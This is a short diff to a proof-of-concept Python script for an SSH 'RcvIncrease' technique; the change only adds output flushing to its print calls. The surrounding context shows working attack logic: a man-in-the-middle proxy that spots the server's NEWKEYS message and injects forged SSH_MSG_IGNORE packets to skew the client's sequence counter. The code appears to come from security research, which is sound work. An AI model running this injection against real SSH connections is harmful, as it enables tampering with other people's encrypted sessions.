@@ -21,8 +21,8 @@ rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
 @click.option("--server-port", default=22, help="The port where the SSH server is running.")
 @click.option("-N", "--increase-by", default=1, help="The number by which C.Rcv will be increased.")
 def cli(proxy_ip, proxy_port, server_ip, server_port, increase_by):
-    print("--- Proof of Concept for RcvIncrease technique ---")
-    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
+    print("--- Proof of Concept for RcvIncrease technique ---", flush=True)
+    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.", flush=True)
     run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_rcvincrease(in_socket, out_socket, increase_by))
 
 def inject_rcvincrease(in_socket, out_socket, increase_by):
@@ -30,17 +30,17 @@ def inject_rcvincrease(in_socket, out_socket, increase_by):
         while True:
             data = in_socket.recv(4096)
             if contains_newkeys(data):
-                print("[+] SSH_MSG_NEWKEYS sent by server identified!")
-                print(f"[+] Injecting {increase_by} SSH_MSG_IGNORE messages to increase C.Rcv by {increase_by}!")
+                print("[+] SSH_MSG_NEWKEYS sent by server identified!", flush=True)
+                print(f"[+] Injecting {increase_by} SSH_MSG_IGNORE messages to increase C.Rcv by {increase_by}!", flush=True)
                 for _ in trange(increase_by):
                     out_socket.send(rogue_msg_ignore)
             if len(data) == 0:
                 break
             out_socket.send(data)
     except ConnectionResetError:
-        print("[!] Socket connection has been reset. Closing sockets.")
+        print("[!] Socket connection has been reset. Closing sockets.", flush=True)
     except OSError:
-        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.")
+        print("[!] Sockets closed by another thread. Terminating pipe_socket_stream thread.", flush=True)
     in_socket.close()
     out_socket.close()
 
